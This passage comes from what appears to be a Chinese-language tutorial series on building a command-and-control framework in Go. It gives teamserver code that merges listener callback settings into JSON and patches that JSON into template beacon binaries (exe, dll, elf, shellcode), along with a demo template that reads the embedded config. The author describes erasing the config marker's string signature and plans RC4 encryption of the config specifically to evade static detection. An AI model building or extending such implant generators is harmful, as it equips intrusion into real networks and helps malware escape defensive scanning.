base64FileName := base64.StdEncoding.EncodeToString([]<span class="type">byte</span>(fileName))  </span><br><span class="line">    base64Content := base64.StdEncoding.EncodeToString(fileContent)  </span><br><span class="line">  </span><br><span class="line">    ctx.JSON(http.StatusOK, gin.H&#123;  </span><br><span class="line">       <span class="string">&quot;code&quot;</span>:    <span class="literal">true</span>,  </span><br><span class="line">       <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Beacon generated successfully&quot;</span>,  </span><br><span class="line">       <span class="string">&quot;data&quot;</span>: response.BeaconFile&#123;  </span><br><span class="line">          FileName:    base64FileName,  </span><br><span class="line">          FileContent: base64Content,  </span><br><span class="line">       &#125;,  </span><br><span class="line">    &#125;)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/listener.go</code> 实现TeamServer接口方法ListenerGetConfig</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> ListenerGetConfig(listenerName <span class="type">string</span>, configType <span class="type">string</span>) (request.ConfigDetail, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span> !ts.Listeners.Contains(listenerName) &#123;  </span><br><span class="line">       <span class="keyword">return</span> request.ConfigDetail&#123;&#125;, fmt.Errorf(<span class="string">&quot;listener %v does not exist&quot;</span>, listenerName)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    value, _ := ts.Listeners.Get(listenerName)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> value.(response.ListenerData).Data, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/beacon.go</code> 实现TeamServer接口方法BeaconGenerate</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> BeaconGenerate(beaconConfig request.BeaconConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> ts.Handler.BeaconGenerate(beaconConfig, listenerConfig)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/types.go</code> 定义BeaconHandler接口的方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconGenerate(beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon.go</code> 找到相应的handler，并返回结果</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> handler  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Handler)</span></span> BeaconGenerate(beaconConfig request.BeaconConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    beaconHandler, ok := h.BeaconHandlers[beaconConfig.BeaconType]  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;beacon handler not found&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> beaconHandler.BeaconGenerate(beaconConfig.Config, listenerConfig)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_main.go</code> 实现BeaconHandler接口的方法BeaconGenerate</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> BeaconGenerate(beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    beaconProfile, err := b.BeaconGenerateProfile(beaconConfig, listenerConfig)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> b.BeaconBuild(beaconProfile, beaconConfig, listenerConfig)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_handler.go</code> </p>
<ul>
<li><code>BeaconGenerateProfile</code>：把 <code>GenerateConfig</code> 和 <code>ConfigDetail</code> 两个结构体的字段抄进 <code>BeaconGenerateConfig</code> 结构体，然后 <code>json.Marshal</code> 成紧凑JSON序列化数据返回。</li>
<li><code>BeaconBuild</code>：根据协议&#x2F;架构&#x2F;格式拼出目录和文件名，然后读取读模板二进制，找到 <code>CONFIG_MARKER_2024</code> 的起始索引，从起始索引开始原地覆盖成4字节小端 <code>profile</code> 长度，这也是为了消除 <code>CONFIG_MARKER_2024</code> 字符串特征。把JSON数据紧接写在长度字段后面，覆盖旧内容。会输出在 <code>static/product</code> 目录，这只是为了教学方便！</li>
</ul>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> beacon  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/binary&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span>    </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;path/filepath&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconGenerateConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    <span class="comment">// 来自 GenerateConfig    </span></span><br><span class="line">    Os            <span class="type">string</span> <span class="string">`json:&quot;os&quot;`</span>  </span><br><span class="line">    Arch          <span class="type">string</span> <span class="string">`json:&quot;arch&quot;`</span>  </span><br><span class="line">    Format        <span class="type">string</span> <span class="string">`json:&quot;format&quot;`</span>  </span><br><span class="line">    Sleep         <span class="type">int</span>    <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter        <span class="type">int</span>    <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    SvcName       <span class="type">string</span> <span class="string">`json:&quot;svcname&quot;`</span>  </span><br><span class="line">    IsKillDate    <span class="type">bool</span>   <span class="string">`json:&quot;is_killdate&quot;`</span>  </span><br><span class="line">    Killdate      <span class="type">string</span> <span class="string">`json:&quot;kill_date&quot;`</span>  </span><br><span class="line">    Killtime      <span class="type">string</span> <span class="string">`json:&quot;kill_time&quot;`</span>  </span><br><span class="line">    IsWorkingTime <span class="type">bool</span>   <span class="string">`json:&quot;is_workingtime&quot;`</span>  </span><br><span class="line">    StartTime     <span class="type">string</span> <span class="string">`json:&quot;start_time&quot;`</span>  </span><br><span class="line">    EndTime       <span class="type">string</span> <span class="string">`json:&quot;end_time&quot;`</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 来自 ConfigDetail（去掉 SSLCertPath 、 SSLKeyPath、PageError等无关配置）  </span></span><br><span class="line">    HostBind          <span class="type">string</span>            <span class="string">`json:&quot;host_bind&quot;`</span>  </span><br><span class="line">    PortBind          <span class="type">int</span>               <span class="string">`json:&quot;port_bind&quot;`</span>  </span><br><span class="line">    CallbackAddresses []<span class="type">string</span>          <span class="string">`json:&quot;callback_addresses&quot;`</span>  </span><br><span class="line">    SSL               <span class="type">bool</span>              <span class="string">`json:&quot;ssl&quot;`</span>  </span><br><span class="line">    SSLCert           []<span class="type">byte</span>            <span class="string">`json:&quot;ssl_cert,omitempty&quot;`</span>  </span><br><span class="line">    SSLKey            []<span class="type">byte</span>            <span class="string">`json:&quot;ssl_key,omitempty&quot;`</span>  </span><br><span class="line">    URI               <span class="type">string</span>            <span class="string">`json:&quot;uri&quot;`</span>  </span><br><span class="line">    HBHeader          <span class="type">string</span>            <span class="string">`json:&quot;hb_header&quot;`</span>  </span><br><span class="line">    HBPrefix          <span class="type">string</span>            <span class="string">`json:&quot;hb_prefix&quot;`</span>  </span><br><span class="line">    UserAgent         <span class="type">string</span>            <span class="string">`json:&quot;user_agent&quot;`</span>  </span><br><span class="line">    HostHeader        <span class="type">string</span>            <span class="string">`json:&quot;host_header&quot;`</span>  </span><br><span class="line">    RequestHeaders    <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;request_headers,omitempty&quot;`</span>  </span><br><span class="line">    ResponseHeaders   <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;response_headers,omitempty&quot;`</span>  </span><br><span class="line">    XForwardedFor     <span class="type">bool</span>              <span class="string">`json:&quot;x_forwarded_for&quot;`</span>  </span><br><span class="line">    PageError         <span class="type">string</span>            <span class="string">`json:&quot;page_error&quot;`</span>  </span><br><span class="line">    PagePayload       <span class="type">string</span>            <span class="string">`json:&quot;page_payload&quot;`</span>  </span><br><span class="line">    ServerHeaders     <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;server_headers,omitempty&quot;`</span>  </span><br><span class="line">    Protocol          <span class="type">string</span>            <span class="string">`json:&quot;protocol&quot;`</span>  </span><br><span class="line">    EncryptKey        []<span class="type">byte</span>            <span class="string">`json:&quot;encrypt_key,omitempty&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> BeaconGenerateProfile(generateConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    merged := BeaconGenerateConfig&#123;  </span><br><span class="line">       <span class="comment">// 从 generateConfig 复制  </span></span><br><span class="line">       Os:            generateConfig.Os,  </span><br><span class="line">       Arch:          generateConfig.Arch,  </span><br><span class="line">       Format:        generateConfig.Format,  </span><br><span class="line">       Sleep:         generateConfig.Sleep,  </span><br><span class="line">       Jitter:        generateConfig.Jitter,  </span><br><span class="line">       SvcName:       generateConfig.SvcName,  </span><br><span class="line">       IsKillDate:    generateConfig.IsKillDate,  </span><br><span class="line">       Killdate:      generateConfig.Killdate,  </span><br><span class="line">       Killtime:      generateConfig.Killtime,  </span><br><span class="line">       IsWorkingTime: generateConfig.IsWorkingTime,  </span><br><span class="line">       StartTime:     generateConfig.StartTime,  </span><br><span class="line">       EndTime:       generateConfig.EndTime,  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 从 listenerConfig 复制  </span></span><br><span class="line">       HostBind:          listenerConfig.HostBind,  </span><br><span class="line">       PortBind:          listenerConfig.PortBind,  </span><br><span class="line">       CallbackAddresses: listenerConfig.CallbackAddresses,  </span><br><span class="line">       SSL:               listenerConfig.SSL,  </span><br><span class="line">       SSLCert:           listenerConfig.SSLCert,  </span><br><span class="line">       SSLKey:            listenerConfig.SSLKey,  </span><br><span class="line">       URI:               listenerConfig.URI,  </span><br><span class="line">       HBHeader:          listenerConfig.HBHeader,  </span><br><span class="line">       HBPrefix:          listenerConfig.HBPrefix,  </span><br><span class="line">  </span><br><span class="line">       UserAgent:       listenerConfig.UserAgent,  </span><br><span class="line">       HostHeader:      listenerConfig.HostHeader,  </span><br><span class="line">       RequestHeaders:  listenerConfig.RequestHeaders,  </span><br><span class="line">       ResponseHeaders: listenerConfig.ResponseHeaders,  </span><br><span class="line">       XForwardedFor:   listenerConfig.XForwardedFor,  </span><br><span class="line">       PageError:       listenerConfig.PageError,  </span><br><span class="line">       PagePayload:     listenerConfig.PagePayload,  </span><br><span class="line">       ServerHeaders:   listenerConfig.ServerHeaders,  </span><br><span class="line">       Protocol:        listenerConfig.Protocol,  </span><br><span class="line">       EncryptKey:      []<span class="type">byte</span>(listenerConfig.EncryptKey),  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 生成紧凑 JSON（无缩进）  </span></span><br><span class="line">    <span class="keyword">return</span> json.Marshal(merged)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> BeaconBuild(profile []<span class="type">byte</span>, beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       dir      <span class="type">string</span>  </span><br><span class="line">       filename <span class="type">string</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    protocol := listenerConfig.Protocol  </span><br><span class="line">    <span class="keyword">switch</span> protocol &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;http&quot;</span>:  </span><br><span class="line">       dir = <span class="string">&quot;static/http&quot;</span>  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;protocol unknown&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    arch := beaconConfig.Arch  </span><br><span class="line">    <span class="keyword">switch</span> arch &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;x86&quot;</span>:  </span><br><span class="line">       dir += <span class="string">&quot;/x86&quot;</span>  </span><br><span class="line">       filename = <span class="string">&quot;stage86&quot;</span>  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;x64&quot;</span>:  </span><br><span class="line">       dir += <span class="string">&quot;/x64&quot;</span>  </span><br><span class="line">       filename = <span class="string">&quot;stage64&quot;</span>  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;arch unknown&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    format := beaconConfig.Format  </span><br><span class="line">    <span class="keyword">switch</span> format &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;exe&quot;</span>:  </span><br><span class="line">       filename += <span class="string">&quot;.exe&quot;</span>  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;dll&quot;</span>:  </span><br><span class="line">       filename += <span class="string">&quot;.dll&quot;</span>  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;elf&quot;</span>:  </span><br><span class="line">       filename += <span class="string">&quot;.elf&quot;</span>  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;shellcode&quot;</span>:  </span><br><span class="line">       filename += <span class="string">&quot;.bin&quot;</span>  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;format unknown&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    template, err := os.ReadFile(filepath.Join(dir, filename))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    marker := []<span class="type">byte</span>(<span class="string">&quot;CONFIG_MARKER_2024&quot;</span>)  </span><br><span class="line">    idx := bytes.Index(template, marker)  </span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">-1</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;marker not found&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 确保不会溢出  </span></span><br><span class="line">    profileSize := <span class="built_in">len</span>(profile)  </span><br><span class="line">    <span class="keyword">if</span> profileSize &gt; <span class="built_in">len</span>(template)-(idx+<span class="number">4</span>) &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;profile too large&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 写入JSON数据长度  </span></span><br><span class="line">    sizeBytes := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)  </span><br><span class="line">    binary.LittleEndian.PutUint32(sizeBytes, <span class="type">uint32</span>(profileSize))  </span><br><span class="line">    <span class="built_in">copy</span>(template[idx:], sizeBytes)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 写入JSON数据  </span></span><br><span class="line">    start := idx + <span class="number">4</span>  </span><br><span class="line">    <span class="built_in">copy</span>(template[start:], profile)  </span><br><span class="line">    err = os.WriteFile(<span class="string">&quot;static/product/&quot;</span>+filename, template, <span class="number">0644</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="string">&quot;&quot;</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> template, filename, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>模板文件.go</code> 的loadConfig方法会在模板文件中的全局placeholder字节切片中读取前4个字节作为接下来要反序列化json数据长度，而后面则是json数据。<strong>注意</strong>长度是小端序，当然也可以大端，与patch操作保持一致即可</p>
<p>为什么要增加4个字节的json数据长度呢？<strong>理由</strong>：在<strong>反序列化阶段</strong>只要碰到裸0x00字节，就会直接返回错误，4字节长度字段是为了能够正常地解析json数据，而不是到了末尾遇到00字节直接报错。</p>
<p>patch前后placeholder字节切片如下图</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/29/20-48-31-71009ae0d80535cb81a7c23eabd620bd-20250729204831-3c366c.png"></p>
<p>我承认这种patch方式很简陋，会浪费很多空间，会有意想不到的错误，而且 <code>BeaconGenerateConfig</code> 有多余的字段，还是那句话：<strong>“这很方便”</strong></p>
<p><code>模板文件.go</code> </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;encoding/binary&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// CONFIG_MARKER_2024 + 5120 字节空洞  </span></span><br><span class="line"><span class="keyword">var</span> placeholder = [<span class="number">5120</span>]<span class="type">byte</span>&#123;  </span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;R&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 运行时读取并反序列化  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadConfig</span><span class="params">()</span></span> (<span class="keyword">map</span>[<span class="type">string</span>]any, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 检查  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(placeholder) &lt; <span class="number">4</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;buffer too small&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 读取json长度  </span></span><br><span class="line">    lengthBytes := placeholder[:<span class="number">4</span>]  </span><br><span class="line">    length := binary.LittleEndian.Uint32(lengthBytes)  </span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;no config embedded&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 检查  </span></span><br><span class="line">    end := <span class="number">4</span> + <span class="type">int</span>(length)  </span><br><span class="line">    <span class="keyword">if</span> end &gt; <span class="built_in">len</span>(placeholder) &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;invalid length&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 反序列化json  </span></span><br><span class="line">    <span class="keyword">var</span> cfg <span class="keyword">map</span>[<span class="type">string</span>]any  </span><br><span class="line">    <span class="keyword">if</span> err := json.Unmarshal(placeholder[<span class="number">4</span>:end], &amp;cfg); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">println</span>(<span class="type">string</span>(placeholder[<span class="number">4</span>:end]))  </span><br><span class="line">    <span class="keyword">return</span> cfg, <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    <span class="comment">// demo 行为：打印配置  </span></span><br><span class="line">    cfg, err := loadConfig()  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;load config failed:&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;running with cfg=%s\n&quot;</span>, cfg)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成模板文件 <code>go build &lt;模板文件名&gt;.go</code> 并将其放置到服务器的 <code>static/http/x64/stage64.exe</code></p>
<p><code>utils/crypt/crypt.go</code>：按道理来说我们需要将内嵌在json数据用RC4加密，然后beacon先进行一次简单的解密获取内嵌的RC4密钥，然后再用解密后的密钥解密所有的配置信息，避免被静态检测出特征。</p>
